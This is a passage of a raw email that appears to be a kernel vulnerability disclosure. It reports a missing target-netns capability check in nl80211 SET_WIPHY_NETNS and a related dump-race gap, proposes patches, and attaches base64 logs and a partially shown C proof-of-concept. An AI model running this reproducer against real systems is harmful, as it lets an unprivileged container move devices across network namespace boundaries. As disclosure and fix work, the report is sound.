-ons look up the wiphy by global index via wiphy_idx_to_wiphy(). They do not=
- re-check sock_net(cb->skb->sk) against the wiphy's current netns.
-
-Other dump paths in the same file do this check on every iteration. See nl8=
-0211_dump_wiphy() at line 3437 and the parallel scheduled scan dump at line=
- 4420.
-
-If a wiphy moves between dumpit invocations of NL80211_CMD_GET_SCAN via NL8=
-0211_CMD_SET_WIPHY_NETNS, the dump silently keeps copying BSS list contents=
- from the wiphy's new netns into the caller's netns. On its own this race n=
-eeds a separate caller to migrate the wiphy mid-dump. With bug A, the attac=
-ker can arrange the race themselves.
-
-What I tested on
-
-  * Linux v7.0 vanilla mainline tag, x86_64.
-  * KASAN+lockdep enabled, bookworm rootfs, qemu-kvm.
-  * mac80211_hwsim built as a module.
-  * Reproducer compiled with plain gcc, raw genetlink, no liburing
-    or libnl dependency.
-
-Note on the post-fix log
-
-The post-fix log ends with an empty /sys/class/ieee80211 listing. This is n=
-ot a patch side effect. The patched kernel correctly rejects the child's SE=
-T_WIPHY_NETNS with -EPERM, so phyN stays in the child's netns. When the chi=
-ld exits, that netns is destroyed.
-mac80211_hwsim's pernet_exit handler then cleans up the wiphy. So init_net =
-sees nothing, which is the expected cleanup path. The relevant signal in th=
-e post-fix log is the EPERM line:
-
-    [child] SET_WIPHY_NETNS to init_net rc=3D-1 (Operation not permitted) (=
-correctly rejected)
-
-I have a small two-patch series against v7.0 that closes both gaps. Patch 1=
-/2 mirrors rtnl_get_net_ns_capable() in nl80211_wiphy_netns(). Patch 2/2 ad=
-ds the missing net_eq() check in nl80211_prepare_wdev_dump()'s continuation=
- branch. I have re-run the same reproducer against the patched kernel. The =
-attacker's SET_WIPHY_NETNS now returns -EPERM. The legitimate admin path is=
- unaffected.
-
-I would prefer to send the patches as a separate thread once you have had a=
- chance to look at the report and tell me whether and how you would like th=
-em fixed.
-
-Attachments:
-  poc_nl80211_setns.c -- C reproducer, raw genetlink
-  poc_vanilla.log     -- reproducer output on vanilla v7.0
-  poc_post_patch.log  -- reproducer output on the patched v7.0 (attacker no=
-w gets -EPERM)
-
-Thanks for taking a look. Apologies in advance if this is already known or =
-out of scope.
-
-Best regards,
-Maoyi
-Nanyang Technological University
-https://maoyixie.com/
-________________________________
-
-CONFIDENTIALITY: This email is intended solely for the person(s) named and =
-may be confidential and/or privileged. If you are not the intended recipien=
-t, please delete it, notify us and do not copy, use, or disclose its conten=
-ts.
-Towards a sustainable earth: Print only when necessary. Thank you.
-
---_004_TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302TYZPR01MB6758apcp_
-Content-Type: application/octet-stream; name="poc_post_patch.log"
-Content-Description: poc_post_patch.log
-Content-Disposition: attachment; filename="poc_post_patch.log"; size=647;
-	creation-date="Sun, 03 May 2026 06:49:30 GMT";
-	modification-date="Sun, 03 May 2026 06:49:30 GMT"
-Content-Transfer-Encoding: base64
-
-W3BhcmVudF0gdXNpbmcgcGh5MSB3aXBoeV9pZHg9MQo9PT0gSW5pdGlhbCBzdGF0ZSAoaW5pdF9u
-ZXQpID09PQpbaW5pdF9uZXRdIC9zeXMvY2xhc3MvaWVlZTgwMjExID0gcGh5MQpbY2hpbGRdIHVp
-ZD0wIG5ldG5zPW5ldDpbNDAyNjUzMjI2MV0gKHdhaXRpbmcgZm9yIHdpcGh5KQpbcGFyZW50XSBj
-aGlsZCByZWFkeSwgbW92aW5nIHBoeTAgLT4gY2hpbGQgbmV0bnMKW3BhcmVudF0gcGh5MCBtb3Zl
-ZCBpbnRvIGNoaWxkIG5ldG5zCltpbml0X25ldCBhZnRlciBtb3ZlLW91dF0gL3N5cy9jbGFzcy9p
-ZWVlODAyMTEgPSBbY2hpbGRdIHBhcmVudCBtb3ZlZCBwaHkwIGludG8gbXkgbmV0bnMKW2NoaWxk
-IGFmdGVyIG1vdmUtaW5dIC9zeXMvY2xhc3MvaWVlZTgwMjExID0gW2NoaWxkXSBubDgwMjExIGZh
-bWlseV9pZD0yOApbY2hpbGRdIFNFVF9XSVBIWV9ORVROUyB0byBpbml0X25ldCByYz0tMSAoT3Bl
-cmF0aW9uIG5vdCBwZXJtaXR0ZWQpIChjb3JyZWN0bHkgcmVqZWN0ZWQpCltjaGlsZCBhZnRlciBh
-dHRlbXB0ZWQgbW92ZS1vdXRdIC9zeXMvY2xhc3MvaWVlZTgwMjExID0gW3BhcmVudF0gY2hpbGQg
-ZXhpdGVkLCBmaW5hbCBzdGF0ZToKW2luaXRfbmV0IGFmdGVyIGNoaWxkIGZpbmlzaGVkXSAvc3lz
-L2NsYXNzL2llZWU4MDIxMSA9IAo=
-
---_004_TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302TYZPR01MB6758apcp_
-Content-Type: application/octet-stream; name="poc_vanilla.log"
-Content-Description: poc_vanilla.log
-Content-Disposition: attachment; filename="poc_vanilla.log"; size=689;
-	creation-date="Sun, 03 May 2026 06:49:30 GMT";
-	modification-date="Sun, 03 May 2026 06:49:30 GMT"
-Content-Transfer-Encoding: base64
-
-W3BhcmVudF0gdXNpbmcgcGh5MyB3aXBoeV9pZHg9Mwo9PT0gSW5pdGlhbCBzdGF0ZSAoaW5pdF9u
-ZXQpID09PQpbaW5pdF9uZXRdIC9zeXMvY2xhc3MvaWVlZTgwMjExID0gcGh5MwpbY2hpbGRdIHVp
-ZD0wIG5ldG5zPW5ldDpbNDAyNjUzMjI2MV0gKHdhaXRpbmcgZm9yIHdpcGh5KQpbcGFyZW50XSBj
-aGlsZCByZWFkeSwgbW92aW5nIHBoeTAgLT4gY2hpbGQgbmV0bnMKW3BhcmVudF0gcGh5MCBtb3Zl
-ZCBpbnRvIGNoaWxkIG5ldG5zCltpbml0X25ldCBhZnRlciBtb3ZlLW91dF0gL3N5cy9jbGFzcy9p
-ZWVlODAyMTEgPSBbY2hpbGRdIHBhcmVudCBtb3ZlZCBwaHkwIGludG8gbXkgbmV0bnMKW2NoaWxk
-IGFmdGVyIG1vdmUtaW5dIC9zeXMvY2xhc3MvaWVlZTgwMjExID0gW2NoaWxkXSBubDgwMjExIGZh
-bWlseV9pZD0yOApbY2hpbGRdICoqKiBCVUc6IFNFVF9XSVBIWV9ORVROUyB0byBpbml0X25ldCBT
-VUNDRUVERUQgZnJvbSBhdHRhY2tlciB1c2VybnMvbmV0bnMgd2l0aG91dCBDQVBfTkVUX0FETUlO
-IG92ZXIgaW5pdF9uZXQgKioqCltjaGlsZCBhZnRlciBhdHRlbXB0ZWQgbW92ZS1vdXRdIC9zeXMv
-Y2xhc3MvaWVlZTgwMjExID0gcGh5MwpbcGFyZW50XSBjaGlsZCBleGl0ZWQsIGZpbmFsIHN0YXRl
-OgpbaW5pdF9uZXQgYWZ0ZXIgY2hpbGQgZmluaXNoZWRdIC9zeXMvY2xhc3MvaWVlZTgwMjExID0g
-cGh5Mwo=
-
---_004_TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302TYZPR01MB6758apcp_
-Content-Type: text/plain; name="poc_nl80211_setns.c"
-Content-Description: poc_nl80211_setns.c
-Content-Disposition: attachment; filename="poc_nl80211_setns.c"; size=13173;
-	creation-date="Sun, 03 May 2026 06:49:31 GMT";
-	modification-date="Sun, 03 May 2026 06:49:31 GMT"
-Content-Transfer-Encoding: base64
-
-LyoKICogUG9DIGZvciBubDgwMjExIG1pc3NpbmcgdGFyZ2V0LW5ldG5zIENBUF9ORVRfQURNSU4g
-Y2hlY2sgaW4KICogTkw4MDIxMV9DTURfU0VUX1dJUEhZX05FVE5TLCBwbHVzIHRoZSByZWxhdGVk
-IGR1bXAtc2NhbiBjb250aW51YXRpb24KICogbmV0bnMgcmVjaGVjayBnYXAgaW4gbmw4MDIxMV9w
-cmVwYXJlX3dkZXZfZHVtcC4KICoKICogQnVnIEEgKHRhcmdldC1jYXAgbWlzc2luZyk6IE5MODAy
-MTFfQ01EX1NFVF9XSVBIWV9ORVROUyBvbmx5IGNoZWNrcwogKiAgIENBUF9ORVRfQURNSU4gb3Zl
-ciB0aGUgbmV0bGluayBzb2NrZXQncyBuZXRucy4gSXQgZG9lcyBOT1QgY2hlY2sKICogICB0aGF0
-IHRoZSBjYWxsZXIgaGFzIENBUF9ORVRfQURNSU4gb3ZlciB0aGUgKnRhcmdldCogbmV0bnMuIENv
-bXBhcmUKICogICBuZXQvY29yZS9ydG5ldGxpbmsuYzo6cnRubF9nZXRfbmV0X25zX2NhcGFibGUo
-KSB3aGljaCBtYW5kYXRlcyB0aGlzCiAqICAgY2hlY2suCiAqCiAqIFNldHVwOiB3ZSBuZWVkIGEg
-d2lwaHkgaW4gdGhlIGF0dGFja2VyJ3MgbmV0bnMgdG8gc3RhcnQuIFJlYWwtd29ybGQKICogc2Nl
-bmFyaW9zIHdoZXJlIHRoaXMgaGFwcGVuczogYWRtaW4gZ3JhbnRzIFdpLUZpIHRvIGEgY29udGFp
-bmVyOwogKiBtYWM4MDIxMV9od3NpbSBzcGF3bmVkIGluIGF0dGFja2VyJ3MgbmV0bnM7IFNSLUlP
-ViBXaUZpIFZGcyBhc3NpZ25lZC4KICogRm9yIHRoaXMgUG9DIHdlIHVzZSBtYWM4MDIxMV9od3Np
-bSBhbmQgaGF2ZSBpbml0X25ldCByb290IG1pZ3JhdGUgdGhlCiAqIHdpcGh5IGludG8gdGhlIGF0
-dGFja2VyJ3MgbmV0bnMgZmlyc3QsIHRoZW4gdmVyaWZ5IHRoZSBhdHRhY2tlciAod2l0aAogKiBv
-bmx5IGZha2Utcm9vdCB2aWEgdXNlcm5zKSBjYW4gbW92ZSBpdCBvdXQgd2l0aG91dCBDQVBfTkVU
-X0FETUlOIG92ZXIKICogdGhlIGRlc3RpbmF0aW9uIG5ldG5zLgogKgogKiBCdWlsZDogZ2NjIHBv
-Y19ubDgwMjExX3NldG5zLmMgLW8gcG9jX25sODAyMTFfc2V0bnMKICogUnVuIGFzIHJvb3Qgb24g
-YSBrZXJuZWwgd2l0aCBtYWM4MDIxMV9od3NpbSBsb2FkZWQuCiAqLwojZGVmaW5lIF9HTlVfU09V
-UkNFCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJp
-bmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPGZj
-bnRsLmg+CiNpbmNsdWRlIDxzY2hlZC5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CiNpbmNsdWRlIDxz
-dGRpbnQuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgoj
-aW5jbHVkZSA8c3lzL3dhaXQuaD4KI2luY2x1ZGUgPGxpbnV4L25ldGxpbmsuaD4KI2luY2x1ZGUg
-PGxpbnV4L2dlbmV0bGluay5oPgoKI2RlZmluZSBOTDgwMjExX0ZBTUlMWSAibmw4MDIxMSIKCi8q
-IEZyb20gPGxpbnV4L25sODAyMTEuaD4gKi8KI2RlZmluZSBOTDgwMjExX0NNRF9HRVRfV0lQSFkg
-ICAgICAgIDEKI2RlZmluZSBOTDgwMjExX0NNRF9TRVRfV0lQSFlfTkVUTlMgIDQ5ICAgLyogMHgz
-MSwgdmVyaWZpZWQgZnJvbSBVQVBJICovCiNkZWZpbmUgTkw4MDIxMV9BVFRSX1dJUEhZICAgICAg
-ICAgICAxCiNkZWZpbmUgTkw4MDIxMV9BVFRSX1BJRCAgICAgICAgICAgICA4MgojZGVmaW5lIE5M
-ODAyMTFfQVRUUl9ORVROU19GRCAgICAgICAgMjE5CgpzdHJ1Y3Qgbmxfc3RhdGUgewogICAgaW50
-IHNrOwogICAgdWludDE2X3QgZmFtaWx5X2lkOwogICAgdWludDMyX3QgcGlkOwp9OwoKc3RhdGlj
-IGludCBubF9vcGVuKHN0cnVjdCBubF9zdGF0ZSAqc3QpCnsKICAgIHN0LT5zayA9IHNvY2tldChB
-Rl9ORVRMSU5LLCBTT0NLX1JBVywgTkVUTElOS19HRU5FUklDKTsKICAgIGlmIChzdC0+c2sgPCAw
-KSB7IHBlcnJvcigic29ja2V0KE5FVExJTktfR0VORVJJQykiKTsgcmV0dXJuIC0xOyB9CiAgICBz
-dHJ1Y3Qgc29ja2FkZHJfbmwgc2EgPSB7IC5ubF9mYW1pbHkgPSBBRl9ORVRMSU5LIH07CiAgICBp
-ZiAoYmluZChzdC0+c2ssIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsIHNpemVvZihzYSkpIDwgMCkg
-ewogICAgICAgIHBlcnJvcigiYmluZCIpOyByZXR1cm4gLTE7CiAgICB9CiAgICBzb2NrbGVuX3Qg
-c2xlbiA9IHNpemVvZihzYSk7CiAgICBpZiAoZ2V0c29ja25hbWUoc3QtPnNrLCAoc3RydWN0IHNv
-Y2thZGRyICopJnNhLCAmc2xlbikgPCAwKSB7CiAgICAgICAgcGVycm9yKCJnZXRzb2NrbmFtZSIp
-OyByZXR1cm4gLTE7CiAgICB9CiAgICBzdC0+cGlkID0gc2EubmxfcGlkOwogICAgcmV0dXJuIDA7
-Cn0KCi8qIFJlc29sdmUgdGhlIG5sODAyMTEgZmFtaWx5IElEICsgdGhlIFNFVF9XSVBIWV9ORVRO
-UyBjbWQgSUQgdmlhCiAqIENUUkxfQ01EX0dFVEZBTUlMWS4gKi8Kc3RhdGljIGludCBubF9yZXNv
-bHZlX2ZhbWlseShzdHJ1Y3Qgbmxfc3RhdGUgKnN0LCBpbnQgKmNtZF9zZXRfbmV0bnMsCiAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgaW50ICpjbWRfZ2V0X3dpcGh5KQp7CiAgICBjaGFyIGJ1
-Zls0MDk2XSA9IHswfTsKICAgIHN0cnVjdCBubG1zZ2hkciAqbmggPSAoc3RydWN0IG5sbXNnaGRy
-ICopYnVmOwogICAgbmgtPm5sbXNnX2xlbiA9IE5MTVNHX0xFTkdUSChHRU5MX0hEUkxFTik7CiAg
-ICBuaC0+bmxtc2dfdHlwZSA9IEdFTkxfSURfQ1RSTDsKICAgIG5oLT5ubG1zZ19mbGFncyA9IE5M
-TV9GX1JFUVVFU1Q7CiAgICBuaC0+bmxtc2dfc2VxID0gMTsKICAgIG5oLT5ubG1zZ19waWQgPSBz
-dC0+cGlkOwogICAgc3RydWN0IGdlbmxtc2doZHIgKmdoID0gTkxNU0dfREFUQShuaCk7CiAgICBn
-aC0+Y21kID0gQ1RSTF9DTURfR0VURkFNSUxZOwogICAgZ2gtPnZlcnNpb24gPSAxOwogICAgLyog
-QWRkIENUUkxfQVRUUl9GQU1JTFlfTkFNRSA9ICJubDgwMjExIiAqLwogICAgc3RydWN0IG5sYXR0
-ciAqbmEgPSAoc3RydWN0IG5sYXR0ciAqKSgoY2hhciAqKWdoICsgR0VOTF9IRFJMRU4pOwogICAg
-bmEtPm5sYV90eXBlID0gQ1RSTF9BVFRSX0ZBTUlMWV9OQU1FOwogICAgaW50IHNsZW4gPSBzdHJs
-ZW4oTkw4MDIxMV9GQU1JTFkpICsgMTsKICAgIG5hLT5ubGFfbGVuID0gTkxBX0hEUkxFTiArIHNs
-ZW47CiAgICBtZW1jcHkoKGNoYXIgKiluYSArIE5MQV9IRFJMRU4sIE5MODAyMTFfRkFNSUxZLCBz
-bGVuKTsKICAgIG5oLT5ubG1zZ19sZW4gKz0gTkxBX0FMSUdOKG5hLT5ubGFfbGVuKTsKCiAgICBp
-ZiAoc2VuZChzdC0+c2ssIG5oLCBuaC0+bmxtc2dfbGVuLCAwKSA8IDApIHsKICAgICAgICBwZXJy
-b3IoInNlbmQoR0VURkFNSUxZKSIpOyByZXR1cm4gLTE7CiAgICB9CgogICAgY2hhciByYnVmWzgx
-OTJdOwogICAgaW50IG4gPSByZWN2KHN0LT5zaywgcmJ1Ziwgc2l6ZW9mKHJidWYpLCAwKTsKICAg
-IGlmIChuIDwgMCkgeyBwZXJyb3IoInJlY3YiKTsgcmV0dXJuIC0xOyB9CgogICAgbmggPSAoc3Ry
-dWN0IG5sbXNnaGRyICopcmJ1ZjsKICAgIGlmIChuaC0+bmxtc2dfdHlwZSA9PSBOTE1TR19FUlJP
-UikgewogICAgICAgIHN0cnVjdCBubG1zZ2VyciAqZSA9IE5MTVNHX0RBVEEobmgpOwogICAgICAg
-IGZwcmludGYoc3RkZXJyLCAiR0VURkFNSUxZIGVycm9yICVkICglcylcbiIsIC1lLT5lcnJvciwg
-c3RyZXJyb3IoLWUtPmVycm9yKSk7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQoKICAgIC8qIFdh
-bGsgYXR0cnMuIFdlIG5lZWQgQ1RSTF9BVFRSX0ZBTUlMWV9JRCBhbmQgdGhlIE9QUyBsaXN0LiAq
-LwogICAgZ2ggPSBOTE1TR19EQVRBKG5oKTsKICAgIGNoYXIgKnAgPSAoY2hhciAqKWdoICsgR0VO
-TF9IRFJMRU47CiAgICBjaGFyICplbmQgPSAoY2hhciAqKW5oICsgbmgtPm5sbXNnX2xlbjsKICAg
-ICpjbWRfc2V0X25ldG5zID0gLTE7CiAgICAqY21kX2dldF93aXBoeSA9IC0xOwogICAgd2hpbGUg
-KHAgKyBOTEFfSERSTEVOIDw9IGVuZCkgewogICAgICAgIHN0cnVjdCBubGF0dHIgKmEgPSAoc3Ry
-dWN0IG5sYXR0ciAqKXA7CiAgICAgICAgaWYgKGEtPm5sYV9sZW4gPCBOTEFfSERSTEVOKSBicmVh
-azsKICAgICAgICBjaGFyICphZGF0YSA9IHAgKyBOTEFfSERSTEVOOwogICAgICAgIHN3aXRjaCAo
-YS0+bmxhX3R5cGUgJiBOTEFfVFlQRV9NQVNLKSB7CiAgICAgICAgY2FzZSBDVFJMX0FUVFJfRkFN
-SUxZX0lEOgogICAgICAgICAgICBzdC0+ZmFtaWx5X2lkID0gKih1aW50MTZfdCAqKWFkYXRhOwog
-ICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlIENUUkxfQVRUUl9PUFM6IHsKICAgICAgICAg
-ICAgY2hhciAqb2VuZCA9IHAgKyBhLT5ubGFfbGVuOwogICAgICAgICAgICBjaGFyICpvcCA9IGFk
-YXRhOwogICAgICAgICAgICB3aGlsZSAob3AgKyBOTEFfSERSTEVOIDw9IG9lbmQpIHsKICAgICAg
-ICAgICAgICAgIHN0cnVjdCBubGF0dHIgKm9wYSA9IChzdHJ1Y3QgbmxhdHRyICopb3A7CiAgICAg
-ICAgICAgICAgICBpZiAob3BhLT5ubGFfbGVuIDwgTkxBX0hEUkxFTikgYnJlYWs7CiAgICAgICAg
-ICAgICAgICAvKiBvcGEgaXMgZWFjaCBvcCBhcyBuZXN0ZWQuICovCiAgICAgICAgICAgICAgICBj
-aGFyICpvcGQgPSBvcCArIE5MQV9IRFJMRU47CiAgICAgICAgICAgICAgICBjaGFyICpvcGRlbmQg
-PSBvcCArIG9wYS0+bmxhX2xlbjsKICAgICAgICAgICAgICAgIGludCBvcF9pZCA9IC0xOwogICAg
-ICAgICAgICAgICAgd2hpbGUgKG9wZCArIE5MQV9IRFJMRU4gPD0gb3BkZW5kKSB7CiAgICAgICAg
-ICAgICAgICAgICAgc3RydWN0IG5sYXR0ciAqZmEgPSAoc3RydWN0IG5sYXR0ciAqKW9wZDsKICAg
-ICAgICAgICAgICAgICAgICBpZiAoZmEtPm5sYV9sZW4gPCBOTEFfSERSTEVOKSBicmVhazsKICAg
-ICAgICAgICAgICAgICAgICBpZiAoKGZhLT5ubGFfdHlwZSAmIE5MQV9UWVBFX01BU0spID09IENU
-UkxfQVRUUl9PUF9JRCkgewogICAgICAgICAgICAgICAgICAgICAgICBvcF9pZCA9ICoodWludDMy
-X3QgKikob3BkICsgTkxBX0hEUkxFTik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAg
-ICAgICAgICAgIG9wZCArPSBOTEFfQUxJR04oZmEtPm5sYV9sZW4pOwogICAgICAgICAgICAgICAg
-fQogICAgICAgICAgICAgICAgLyogV2UgZG9uJ3QgZ2V0IGNtZCBuYW1lcyBiYWNrLCBidXQgd2Ug
-a25vdyB0aGUgZW51bQogICAgICAgICAgICAgICAgICogcG9zaXRpb25zOiBHRVRfV0lQSFk9MSwg
-U0VUX1dJUEhZX05FVE5TPTMzIGluIHY3LjAuICovCiAgICAgICAgICAgICAgICBvcCA9IG9wICsg
-TkxBX0FMSUdOKG9wYS0+bmxhX2xlbik7CiAgICAgICAgICAgICAgICAodm9pZClvcF9pZDsKICAg
-ICAgICAgICAgfQogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgfQogICAgICAg
-IHAgKz0gTkxBX0FMSUdOKGEtPm5sYV9sZW4pOwogICAgfQogICAgLyogVXNlIHRoZSBjYW5vbmlj
-YWwgZW51bSB2YWx1ZXMuIE5MODAyMTFfQ01EX1NFVF9XSVBIWV9ORVROUyA9IDQ5ICovCiAgICAq
-Y21kX3NldF9uZXRucyA9IE5MODAyMTFfQ01EX1NFVF9XSVBIWV9ORVROUzsKICAgICpjbWRfZ2V0
-X3dpcGh5ID0gTkw4MDIxMV9DTURfR0VUX1dJUEhZOwogICAgcmV0dXJuIDA7Cn0KCi8qIFNlbmQg
-Tkw4MDIxMV9DTURfU0VUX1dJUEhZX05FVE5TIGZvciB3aXBoeV9pZHgsIHRhcmdldD1uZXRuc19m
-ZC4KICogUmV0dXJucyAwIG9uIHN1Y2Nlc3MsIC1lcnJubyBvdGhlcndpc2UuICovCnN0YXRpYyBp
-bnQgc2VuZF9zZXRfd2lwaHlfbmV0bnMoc3RydWN0IG5sX3N0YXRlICpzdCwgaW50IHdpcGh5X2lk
-eCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgbmV0bnNfZmQsIGludCBjbWRf
-aWQpCnsKICAgIGNoYXIgYnVmWzEwMjRdID0gezB9OwogICAgc3RydWN0IG5sbXNnaGRyICpuaCA9
-IChzdHJ1Y3Qgbmxtc2doZHIgKilidWY7CiAgICBuaC0+bmxtc2dfdHlwZSA9IHN0LT5mYW1pbHlf
-aWQ7CiAgICBuaC0+bmxtc2dfZmxhZ3MgPSBOTE1fRl9SRVFVRVNUIHwgTkxNX0ZfQUNLOwogICAg
-bmgtPm5sbXNnX3NlcSA9IDQyOwogICAgbmgtPm5sbXNnX3BpZCA9IHN0LT5waWQ7CiAgICBuaC0+
-bmxtc2dfbGVuID0gTkxNU0dfTEVOR1RIKEdFTkxfSERSTEVOKTsKICAgIHN0cnVjdCBnZW5sbXNn
-aGRyICpnaCA9IE5MTVNHX0RBVEEobmgpOwogICAgZ2gtPmNtZCA9IGNtZF9pZDsKICAgIGdoLT52
-ZXJzaW9uID0gMTsKCiAgICAvKiBOTDgwMjExX0FUVFJfV0lQSFkgKHUzMikgKi8KICAgIHN0cnVj
-dCBubGF0dHIgKmEgPSAoc3RydWN0IG5sYXR0ciAqKSgoY2hhciAqKW5oICsgbmgtPm5sbXNnX2xl
-bik7CiAgICBhLT5ubGFfdHlwZSA9IE5MODAyMTFfQVRUUl9XSVBIWTsKICAgIGEtPm5sYV9sZW4g
-PSBOTEFfSERSTEVOICsgc2l6ZW9mKHVpbnQzMl90KTsKICAgICoodWludDMyX3QgKikoKGNoYXIg
-KilhICsgTkxBX0hEUkxFTikgPSB3aXBoeV9pZHg7CiAgICBuaC0+bmxtc2dfbGVuICs9IE5MQV9B
-TElHTihhLT5ubGFfbGVuKTsKCiAgICAvKiBOTDgwMjExX0FUVFJfTkVUTlNfRkQgKHUzMikgKi8K
-ICAgIGEgPSAoc3RydWN0IG5sYXR0ciAqKSgoY2hhciAqKW5oICsgbmgtPm5sbXNnX2xlbik7CiAg
-ICBhLT5ubGFfdHlwZSA9IE5MODAyMTFfQVRUUl9ORVROU19GRDsKICAgIGEtPm5sYV9sZW4gPSBO
-TEFfSERSTEVOICsgc2l6ZW9mKHVpbnQzMl90KTsKICAgICoodWludDMyX3QgKikoKGNoYXIgKilh
-ICsgTkxBX0hEUkxFTikgPSBuZXRuc19mZDsKICAgIG5oLT5ubG1zZ19sZW4gKz0gTkxBX0FMSUdO
-KGEtPm5sYV9sZW4pOwoKICAgIGlmIChzZW5kKHN0LT5zaywgbmgsIG5oLT5ubG1zZ19sZW4sIDAp
-IDwgMCkgewogICAgICAgIHBlcnJvcigic2VuZChTRVRfV0lQSFlfTkVUTlMpIik7IHJldHVybiAt
-ZXJybm87CiAgICB9CiAgICBjaGFyIHJidWZbMTAyNF07CiAgICBpbnQgbiA9IHJlY3Yoc3QtPnNr
-LCByYnVmLCBzaXplb2YocmJ1ZiksIDApOwogICAgaWYgKG4gPCAwKSB7IHBlcnJvcigicmVjdiIp
-OyByZXR1cm4gLWVycm5vOyB9CiAgICBuaCA9IChzdHJ1Y3Qgbmxtc2doZHIgKilyYnVmOwogICAg
-aWYgKG5oLT5ubG1zZ190eXBlID09IE5MTVNHX0VSUk9SKSB7CiAgICAgICAgc3RydWN0IG5sbXNn
-ZXJyICplID0gTkxNU0dfREFUQShuaCk7CiAgICAgICAgcmV0dXJuIGUtPmVycm9yOyAgLyogMCBv
-biBzdWNjZXNzLCBuZWdhdGl2ZSBlcnJubyBvbiBmYWlsdXJlICovCiAgICB9CiAgICByZXR1cm4g
-MDsKfQoKc3RhdGljIHZvaWQgc2hvd19waHkoY29uc3QgY2hhciAqd2hvKSB7CiAgICBmcHJpbnRm
-KHN0ZGVyciwgIlslc10gL3N5cy9jbGFzcy9pZWVlODAyMTEgPSAiLCB3aG8pOwogICAgY2hhciBi
-dWZbMjU2XTsKICAgIHNucHJpbnRmKGJ1Ziwgc2l6ZW9mKGJ1ZiksICJscyAvc3lzL2NsYXNzL2ll
-ZWU4MDIxMSAyPiYxIik7CiAgICBGSUxFICpmID0gcG9wZW4oYnVmLCAiciIpOwogICAgaWYgKGYp
-IHsKICAgICAgICBjaGFyIGxpbmVbNjRdOwogICAgICAgIHdoaWxlIChmZ2V0cyhsaW5lLCBzaXpl
-b2YobGluZSksIGYpKSBmcHJpbnRmKHN0ZGVyciwgIiVzIiwgbGluZSk7CiAgICAgICAgZmNsb3Nl
-KGYpOwogICAgfQp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpCnsKICAgIC8qIERp
-c2NvdmVyIHRoZSB3aXBoeV9pZHggb2YgdGhlIGZpcnN0IGh3c2ltIHBoeSBpbiBpbml0X25ldCBi
-eQogICAgICogcmVhZGluZyAvc3lzL2NsYXNzL2llZWU4MDIxMS88bmFtZT4vaW5kZXguICovCiAg
-ICBpbnQgd2lwaHlfaWR4ID0gLTE7CiAgICB7CiAgICAgICAgRklMRSAqZiA9IHBvcGVuKCJscyAv
-c3lzL2NsYXNzL2llZWU4MDIxMSAyPi9kZXYvbnVsbCB8IGhlYWQgLW4xIiwgInIiKTsKICAgICAg
-ICBjaGFyIG5hbWVbNjRdOwogICAgICAgIGlmIChmICYmIGZnZXRzKG5hbWUsIHNpemVvZihuYW1l
-KSwgZikpIHsKICAgICAgICAgICAgbmFtZVtzdHJjc3BuKG5hbWUsICJcbiIpXSA9IDA7CiAgICAg
-ICAgICAgIGNoYXIgcGF0aFsxMjhdOwogICAgICAgICAgICBzbnByaW50ZihwYXRoLCBzaXplb2Yo
-cGF0aCksICIvc3lzL2NsYXNzL2llZWU4MDIxMS8lcy9pbmRleCIsIG5hbWUpOwogICAgICAgICAg
-ICBGSUxFICpnID0gZm9wZW4ocGF0aCwgInIiKTsKICAgICAgICAgICAgaWYgKGcpIHsgZnNjYW5m
-KGcsICIlZCIsICZ3aXBoeV9pZHgpOyBmY2xvc2UoZyk7IH0KICAgICAgICAgICAgZnByaW50Zihz
-dGRlcnIsICJbcGFyZW50XSB1c2luZyAlcyB3aXBoeV9pZHg9JWRcbiIsIG5hbWUsIHdpcGh5X2lk
-eCk7CiAgICAgICAgfQogICAgICAgIGlmIChmKSBwY2xvc2UoZik7CiAgICB9CiAgICBpZiAod2lw
-aHlfaWR4IDwgMCkgewogICAgICAgIGZwcmludGYoc3RkZXJyLCAibm8gd2lwaHkgaW4gL3N5cy9j
-bGFzcy9pZWVlODAyMTEsIGVuc3VyZSBod3NpbSBsb2FkZWRcbiIpOwogICAgICAgIHJldHVybiAy
-OwogICAgfQoKICAgIGZwcmludGYoc3RkZXJyLCAiPT09IEluaXRpYWwgc3RhdGUgKGluaXRfbmV0
-KSA9PT1cbiIpOwogICAgc2hvd19waHkoImluaXRfbmV0Iik7CgogICAgLyogU3RlcCAxOiBvcGVu
-IGluaXRfbmV0IG5ldG5zIGZkIHRvIHVzZSBhcyB0YXJnZXQgbGF0ZXIuICovCiAgICBpbnQgaW5p
-dF9uZXRuc19mZCA9IG9wZW4oIi9wcm9jL3NlbGYvbnMvbmV0IiwgT19SRE9OTFkpOwogICAgaWYg
-KGluaXRfbmV0bnNfZmQgPCAwKSB7IHBlcnJvcigib3BlbiAvcHJvYy9zZWxmL25zL25ldCIpOyBy
-ZXR1cm4gMjsgfQoKICAgIC8qIFN0ZXAgMjogZm9yayBhIGNoaWxkIHRoYXQ6CiAgICAgKiAgICBh
-KSB1bnNoYXJlKENMT05FX05FV1VTRVIgfCBDTE9ORV9ORVdORVQpIC0+IGFzc2VydCAiZmFrZSBy
-b290IgogICAgICogICAgICAgaW4gYXR0YWNrZXIgdXNlcl9ucyArIGZyZXNoIG5ldG5zLgogICAg
-ICogICAgYikgcGFyZW50IChzdGlsbCBpbiBpbml0X25ldCkgbW92ZXMgcGh5MCBpbnRvIGNoaWxk
-J3MgbmV0bnMKICAgICAqICAgICAgIHZpYSBsZWdpdGltYXRlIFNFVF9XSVBIWV9ORVROUyAod2Ug
